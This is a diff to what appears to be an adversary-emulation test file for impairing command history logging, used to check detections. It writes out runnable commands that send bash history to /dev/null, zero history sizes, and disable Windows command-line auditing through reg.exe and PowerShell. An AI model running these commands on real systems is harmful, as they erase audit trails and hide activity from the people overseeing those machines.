@@ -1,5 +1,5 @@
 attack_technique: T1562.003
-display_name: 'Impair Defenses: HISTCONTROL'
+display_name: 'Impair Defenses: Impair Command History Logging'
 atomic_tests:
 - name: Disable history collection
   auto_generated_guid: 4eafdb45-0f79-4d66-aa86-a3e2c08791f5
@@ -90,7 +90,6 @@ atomic_tests:
       history -c 
       ls -la $HISTFILE # " ls -la $HISTFILE"
       if [ $(history |wc -l) -eq 1 ]; then echo "ls -la is not in history cache"; fi
-      # -> ls -la is not in history cache
       if [ "$HISTCONTROL" != "erasedups" ]; then export HISTCONTROL="erasedups"; fi
       history -c 
       ls -la $HISTFILE
@@ -114,8 +113,10 @@ atomic_tests:
       TEST=$(echo $HISTFILESIZE)
       echo $HISTFILESIZE
       export HISTFILESIZE=0
-      if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; fi
-      # -> $HISTFILESIZE is zero
+      echo "runnning some commands to populate the history"
+      whoami
+      groups
+      if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT";  fi
     cleanup_command: |
       export HISTCONTROL=$(echo $TEST)
 - name: Setting the HISTSIZE environment variable
@@ -132,8 +133,10 @@ atomic_tests:
     command: |
       echo $HISTSIZE
       export HISTSIZE=0
-      if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; fi
-      # -> $HISTSIZE is zero
+      echo "runnning some commands to populate the history"
+      whoami
+      groups
+      if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; else HIST_LENGTH=$(wc -l $HISTFILE); echo "\$HISTSIZE is not zero, history size is $HIST_LENGTH";  fi
     cleanup_command: |
       export HISTSIZE=100
 
@@ -152,8 +155,10 @@ atomic_tests:
       TEST=$(echo $HISTFILE)
       echo $HISTFILE
       export HISTFILE="/dev/null"
-      if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi
-      # -> $HISTFILE is /dev/null
+      echo "runnning some commands to populate the history"
+      whoami
+      groups
+      if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT";  fi
     cleanup_command: |
       export HISTFILE=$(echo $TEST)
 - name: Setting the HISTFILE environment variable (freebsd)
@@ -171,7 +176,6 @@ atomic_tests:
       echo $HISTFILE
       export HISTFILE="/dev/null"
       if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi
-      # -> $HISTFILE is /dev/null
     cleanup_command: |
       export HISTFILE=~/.sh_history
 - name: Setting the HISTIGNORE environment variable 
@@ -187,20 +191,76 @@ atomic_tests:
     elevation_required: false
     command: |
       if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='ls*:rm*:ssh*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi
-      # -> $HISTIGNORE = ls*:rm*:ssh*
       history -c 
       ls -la $HISTFILE
       ls -la ~/.bash_logout
       if [ $(history |wc -l) -eq 1 ]; then echo "ls commands are not in history"; fi
-      # -> ls commands are not in history
       unset HISTIGNORE
-
       if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi
-      # -> $HISTIGNORE = *
       history -c 
       whoami
       groups
       if [ $(history |wc -l) -eq 0 ]; then echo "History cache is empty"; fi
-      # -> History cache is empty
     cleanup_command: |
       unset HISTIGNORE
+
+- name: Disable Windows Command Line Auditing using reg.exe
+  auto_generated_guid: 1329d5ab-e10e-4e5e-93d1-4d907eb656e5
+  description: |
+    In Windows operating systems, command line auditing is controlled through the following registry value:
+    
+      Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+      
+      Registry Value: ProcessCreationIncludeCmdLine_Enabled
+    
+    When command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.
+    This information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.
+    By default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.
+    Conversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.
+    
+    Because this attack executes reg.exe using a command prompt, this attack can be detected by monitoring both:
+      Process Creation events for reg.exe (Windows Event ID 4688, Sysmon Event ID 1)
+      Registry events (Windows Event ID 4657, Sysmon Event ID 13)
+
+    Read more here:
+    https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
+    cleanup_command: |
+      reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+- name: Disable Windows Command Line Auditing using Powershell Cmdlet
+  auto_generated_guid: 95f5c72f-6dfe-45f3-a8c1-d8faa07176fa
+  description: |
+    In Windows operating systems, command line auditing is controlled through the following registry value:
+    
+      Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+      
+      Registry Value: ProcessCreationIncludeCmdLine_Enabled
+    
+    When command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.
+    This information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.
+    By default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.
+    Conversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.
+    
+    Because this attack runs a Powershell cmdlet, this attack can be detected by monitoring both:
+      Powershell Logging (Windows Powershell Event ID 400, 800, 4103, 4104)
+      Registry events (Windows Event ID 4657, Sysmon Event ID 13)
+
+    Read more here:
+    https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
+    https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
+    cleanup_command: |
+      New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore
+      
